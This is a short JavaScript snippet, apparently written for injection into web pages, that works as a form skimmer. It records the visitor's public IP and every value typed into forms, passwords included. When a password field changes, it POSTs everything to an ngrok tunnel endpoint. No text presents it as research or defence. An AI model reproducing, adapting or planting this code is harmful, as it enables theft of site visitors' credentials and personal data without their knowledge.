(() => {
    
        let data = { host : location.hostname },
            flag = false;
        
        fetch('https://api.ipify.org?format=json').then((resp) => resp.json()).then((e) => data.user_addr = e.ip);
    
        !Array.from(document.querySelectorAll('textarea')).length &&
        Array.from(document.querySelectorAll('form'))
            .map((e) => {
                
                let api = (data) => {
                    flag = false;
                    fetch('https://a678b611.ngrok.io/data', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body : JSON.stringify(data) })
                        .then( (resp) => resp.json())
                        .then( (data) => console.log('success', data) )
                };
    
                e.addEventListener('keyup', (e) => {
                    
                    data[`${ e.target.name }_${ e.target.className }_${ e.target.id }`] = {
                        value : e.target.value,
                        type  : e.target.type
                    };

                    !flag && e.target.type === 'password' && [
                        flag = true,
                        e.target.onchange = (e) => [ api(data), alert('change')]
                    ];
                });

                /*
                
                e.onkeydown = (e) => {
                    if(flag && e.keyCode === 13) [ api(data), alert('down')];
                };

                e.onsubmit = () => {
                    if(flag) [ api(data), alert('submit')];
                };

                */

                // etc... keyup : socket streams
            });
    
    })();